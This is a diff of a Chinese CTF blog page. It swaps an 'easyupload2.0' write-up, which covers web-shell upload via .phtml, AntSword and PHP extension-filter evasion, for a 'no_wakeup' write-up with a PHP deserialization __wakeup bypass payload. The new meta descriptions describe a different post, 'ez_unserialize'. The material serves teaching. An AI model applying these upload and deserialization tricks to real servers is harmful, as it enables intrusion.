@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="[SWPUCTF 2021 新生赛]no_wakeup lamaper的WriteUp\r知识点：反序列化、__weakup()绕过\r进入题目发现源代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#34;Content-type:text/html;charset=utf-8&#34;); error_reporting(0); show_source(&#34;class.php&#34;); class HaHaHa{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =&#34;user&#34;; $this-&gt;passwd = &#34;123456&#34;; } public function __wakeup(){ $this-&gt;passwd = sha1($this-&gt;passwd); } public function __destruct(){ if($this-&gt;admin === &#34;admin&#34; &amp;&amp; $this-&gt;passwd === &#34;wllm&#34;){ include(&#34;flag.php&#34;); echo $flag; }else{ echo $this-&gt;passwd; echo &#34;No wake up&#34;; } } } $Letmeseesee = $_GET[&#39;p&#39;]; unserialize($Letmeseesee); ?&gt; 在29行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="[SWPUCTF 2021 新生赛]ez_unserialize lamaper的WriteUp\rSWPUCTF 2021 新生赛 ez_unserialize lamaper的WriteUp | NSSCTF\n知识点：robots.txt、php反序列化漏洞\r进入环境，没有给出任何提示，不知道题目要求干什么，使用后台扫描工具（御剑后台扫描、dirmap等）可以看到存在一个robots.txt；\n关于robots.txt，robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。 但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照。 如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。\n从robots文件中得知存在/cl45s.php，遂进入该目录下打开该文件，获得代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 &lt;?php error_reporting(0); show_source(&#34;cl45s.php&#34;); class wllm{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =&#34;user&#34;; $this-&gt;passwd = &#34;123456&#34;; } public function __destruct(){ if($this-&gt;admin === &#34;admin&#34; &amp;&amp; $this-&gt;passwd === &#34;ctf&#34;){ include(&#34;flag.php&#34;); echo $flag; }else{ echo $this-&gt;admin; echo $this-&gt;passwd; echo &#34;Just a bit more!&#34;; } } } $p = $_GET[&#39;p&#39;]; unserialize($p); ?&gt; 可以看到类wllm中，__destruct()方法被重写，需要修改类成员变量内部值来获取flag，因为__destruct()方法是在对象被销毁是调用，由此我们先创建一个对象，给其成员赋值然后进行序列化\n">
 <title> [SWPUCTF 2021 新生赛]no_wakeup</title>
 
 <link rel='canonical' href='https://lamaper.github.io/p/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bno_wakeup/'>
 
 <link rel="stylesheet" href="/scss/style.min.64bf2e87443aa336f3a74572bf9f691351951bd9b72457795c5ab65e9b853c27.css"><meta property='og:title' content=" [SWPUCTF 2021 新生赛]no_wakeup">
-<meta property='og:description' content="[SWPUCTF 2021 新生赛]no_wakeup lamaper的WriteUp\r知识点：反序列化、__weakup()绕过\r进入题目发现源代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#34;Content-type:text/html;charset=utf-8&#34;); error_reporting(0); show_source(&#34;class.php&#34;); class HaHaHa{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =&#34;user&#34;; $this-&gt;passwd = &#34;123456&#34;; } public function __wakeup(){ $this-&gt;passwd = sha1($this-&gt;passwd); } public function __destruct(){ if($this-&gt;admin === &#34;admin&#34; &amp;&amp; $this-&gt;passwd === &#34;wllm&#34;){ include(&#34;flag.php&#34;); echo $flag; }else{ echo $this-&gt;passwd; echo &#34;No wake up&#34;; } } } $Letmeseesee = $_GET[&#39;p&#39;]; unserialize($Letmeseesee); ?&gt; 在29行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；\n">
+<meta property='og:description' content="[SWPUCTF 2021 新生赛]ez_unserialize lamaper的WriteUp\rSWPUCTF 2021 新生赛 ez_unserialize lamaper的WriteUp | NSSCTF\n知识点：robots.txt、php反序列化漏洞\r进入环境，没有给出任何提示，不知道题目要求干什么，使用后台扫描工具（御剑后台扫描、dirmap等）可以看到存在一个robots.txt；\n关于robots.txt，robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。 但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照。 如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。\n从robots文件中得知存在/cl45s.php，遂进入该目录下打开该文件，获得代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 &lt;?php error_reporting(0); show_source(&#34;cl45s.php&#34;); class wllm{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =&#34;user&#34;; $this-&gt;passwd = &#34;123456&#34;; } public function __destruct(){ if($this-&gt;admin === &#34;admin&#34; &amp;&amp; $this-&gt;passwd === &#34;ctf&#34;){ include(&#34;flag.php&#34;); echo $flag; }else{ echo $this-&gt;admin; echo $this-&gt;passwd; echo &#34;Just a bit more!&#34;; } } } $p = $_GET[&#39;p&#39;]; unserialize($p); ?&gt; 可以看到类wllm中，__destruct()方法被重写，需要修改类成员变量内部值来获取flag，因为__destruct()方法是在对象被销毁是调用，由此我们先创建一个对象，给其成员赋值然后进行序列化\n">
 <meta property='og:url' content='https://lamaper.github.io/p/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bno_wakeup/'>
 <meta property='og:site_name' content='lamaper的博客'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ctf' /><meta property='article:published_time' content='2022-08-09T20:42:00&#43;08:00'/><meta property='article:modified_time' content='2022-08-09T20:42:00&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ctf' /><meta property='article:published_time' content='2022-08-09T20:12:00&#43;08:00'/><meta property='article:modified_time' content='2022-08-09T20:12:00&#43;08:00'/>
 <meta name="twitter:title" content=" [SWPUCTF 2021 新生赛]no_wakeup">
-<meta name="twitter:description" content="[SWPUCTF 2021 新生赛]no_wakeup lamaper的WriteUp\r知识点：反序列化、__weakup()绕过\r进入题目发现源代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#34;Content-type:text/html;charset=utf-8&#34;); error_reporting(0); show_source(&#34;class.php&#34;); class HaHaHa{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =&#34;user&#34;; $this-&gt;passwd = &#34;123456&#34;; } public function __wakeup(){ $this-&gt;passwd = sha1($this-&gt;passwd); } public function __destruct(){ if($this-&gt;admin === &#34;admin&#34; &amp;&amp; $this-&gt;passwd === &#34;wllm&#34;){ include(&#34;flag.php&#34;); echo $flag; }else{ echo $this-&gt;passwd; echo &#34;No wake up&#34;; } } } $Letmeseesee = $_GET[&#39;p&#39;]; unserialize($Letmeseesee); ?&gt; 在29行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；\n">
+<meta name="twitter:description" content="[SWPUCTF 2021 新生赛]ez_unserialize lamaper的WriteUp\rSWPUCTF 2021 新生赛 ez_unserialize lamaper的WriteUp | NSSCTF\n知识点：robots.txt、php反序列化漏洞\r进入环境，没有给出任何提示，不知道题目要求干什么，使用后台扫描工具（御剑后台扫描、dirmap等）可以看到存在一个robots.txt；\n关于robots.txt，robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。 但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照。 如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。\n从robots文件中得知存在/cl45s.php，遂进入该目录下打开该文件，获得代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 &lt;?php error_reporting(0); show_source(&#34;cl45s.php&#34;); class wllm{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =&#34;user&#34;; $this-&gt;passwd = &#34;123456&#34;; } public function __destruct(){ if($this-&gt;admin === &#34;admin&#34; &amp;&amp; $this-&gt;passwd === &#34;ctf&#34;){ include(&#34;flag.php&#34;); echo $flag; }else{ echo $this-&gt;admin; echo $this-&gt;passwd; echo &#34;Just a bit more!&#34;; } } } $p = $_GET[&#39;p&#39;]; unserialize($p); ?&gt; 可以看到类wllm中，__destruct()方法被重写，需要修改类成员变量内部值来获取flag，因为__destruct()方法是在对象被销毁是调用，由此我们先创建一个对象，给其成员赋值然后进行序列化\n">
     <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/108182318?v=4" />
 
     </head>
@@ -259,12 +259,7 @@
   <ol>
     <li>
       <ol>
-        <li><a href="#知识点远程执行php的多种格式">知识点：远程执行，php的多种格式</a></li>
-        <li><a href="#复盘">复盘</a>
-          <ol>
-            <li><a href="#另">另</a></li>
-          </ol>
-        </li>
+        <li><a href="#知识点反序列化__weakup绕过">知识点：反序列化、__weakup()绕过</a></li>
       </ol>
     </li>
   </ol>
@@ -373,60 +368,9 @@
     <section class="article-content">
     
     
-    <h1 id="swpuctf-2021-新生赛easyupload20-lamaper的writeup">[SWPUCTF 2021 新生赛]easyupload2.0 lamaper的WriteUp
-</h1><p><a class="link" href="https://www.nssctf.cn/note/set/377"  target="_blank" rel="noopener"
-    >SWPUCTF 2021 新生赛easyupload2.0 lamaper的WriteUp | NSSCTF</a></p>
-<h3 id="知识点远程执行php的多种格式">知识点：远程执行，php的多种格式
-</h3><p>一打开题目发现需要上传文件，尝试后台扫描发现git库泄漏，但没发现有用的东西，于是上传一句话木马，发现不能上传php，于是修改文件扩展名为。phtml成功上传，使用中国蚁剑进行远程连接，发现目录中有flag.php</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat ../flag.php
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>获得flag</p>
-<h3 id="复盘">复盘
-</h3><p>分析一下源代码
-index.php</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;meta charset=</span><span class="se">\&#34;</span><span class="s2">utf-8</span><span class="se">\&#34;</span><span class="s2">&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;title&gt;下手轻点，求求了&lt;/title&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;a&gt;&lt;img src=</span><span class="se">\&#34;</span><span class="s2">https://gitee.com/a-sprite-of-84/docker-upload1/raw/master/images/upload1.jpg</span><span class="se">\&#34;</span><span class="s2"> alt=</span><span class="se">\&#34;</span><span class="s2">upload1.jpg</span><span class="se">\&#34;</span><span class="s2"> border=</span><span class="se">\&#34;</span><span class="s2">0</span><span class="se">\&#34;</span><span class="s2"> /&gt;&lt;/a&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;form action=</span><span class="se">\&#34;</span><span class="s2">upload.php</span><span class="se">\&#34;</span><span class="s2"> method=</span><span class="se">\&#34;</span><span class="s2">post</span><span class="se">\&#34;</span><span class="s2"> enctype=</span><span class="se">\&#34;</span><span class="s2">multipart/form-data</span><span class="se">\&#34;</span><span class="s2">&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;input type=</span><span class="se">\&#34;</span><span class="s2">file</span><span class="se">\&#34;</span><span class="s2"> name=</span><span class="se">\&#34;</span><span class="s2">uploaded</span><span class="se">\&#34;</span><span class="s2"> /&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;br/&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;input type=</span><span class="se">\&#34;</span><span class="s2">submit</span><span class="se">\&#34;</span><span class="s2"> name=</span><span class="se">\&#34;</span><span class="s2">submit</span><span class="se">\&#34;</span><span class="s2"> value=</span><span class="se">\&#34;</span><span class="s2">感觉要被秒了</span><span class="se">\&#34;</span><span class="s2"> /&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/form&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])){</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nx">time</span><span class="p">()</span> <span class="o">.</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nx">rand</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">1000</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>upload.php</p>
+    <h1 id="swpuctf-2021-新生赛no_wakeup-lamaper的writeup">[SWPUCTF 2021 新生赛]no_wakeup lamaper的WriteUp
+</h1><h3 id="知识点反序列化__weakup绕过">知识点：反序列化、__weakup()绕过
+</h3><p>进入题目发现源代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -459,47 +403,77 @@ index.php</p>
 </span><span class="lnt">28
 </span><span class="lnt">29
 </span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;meta charset=</span><span class="se">\&#34;</span><span class="s2">utf-8</span><span class="se">\&#34;</span><span class="s2">&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])){</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nx">time</span><span class="p">()</span> <span class="o">.</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nx">rand</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">1000</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">]))</span> 
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$target_path</span>  <span class="o">=</span>  <span class="s2">&#34;./upload&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$t_path</span> <span class="o">=</span> <span class="nv">$target_path</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$uploaded_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$uploaded_ext</span>  <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$uploaded_name</span><span class="p">,</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$uploaded_name</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$uploaded_size</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$uploaded_tmp</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/php|hta|ini/i&#34;</span><span class="p">,</span> <span class="nv">$uploaded_ext</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;php是不行滴&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">else</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$uploaded_tmp</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_tmp</span><span class="p">,</span> <span class="nv">$t_path</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$t_path</span><span class="si">}</span><span class="s2"> succesfully uploaded!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;class.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">HaHaHa</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$admin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$passwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">=</span><span class="s2">&#34;user&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">=</span> <span class="s2">&#34;123456&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="k">else</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;不传🐎还想要f1ag?&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">===</span> <span class="s2">&#34;admin&#34;</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">===</span> <span class="s2">&#34;wllm&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;No wake up&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Letmeseesee</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$Letmeseesee</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>发现用正则表达式过滤了.php/.hta/.ini，因而除了php以外的php文件都可以上传；</p>
-<h4 id="另">另
-</h4><p>php3，php5，pht，phtml，phps都是php可运行的文件扩展名</p>
+</div><p>在29行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；</p>
+<p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$aa</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">HaHaHa</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">=</span> <span class="s2">&#34;wllm&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$stus</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$aa</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$stus</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:6:&#34;HaHaHa&#34;:2:{s:5:&#34;admin&#34;;s:5:&#34;admin&#34;;s:6:&#34;passwd&#34;;s:4:&#34;wllm&#34;;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:6:&#34;HaHaHa&#34;:3:{s:5:&#34;admin&#34;;s:5:&#34;admin&#34;;s:6:&#34;passwd&#34;;s:4:&#34;wllm&#34;;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传即可</p>
 
 </section>
 
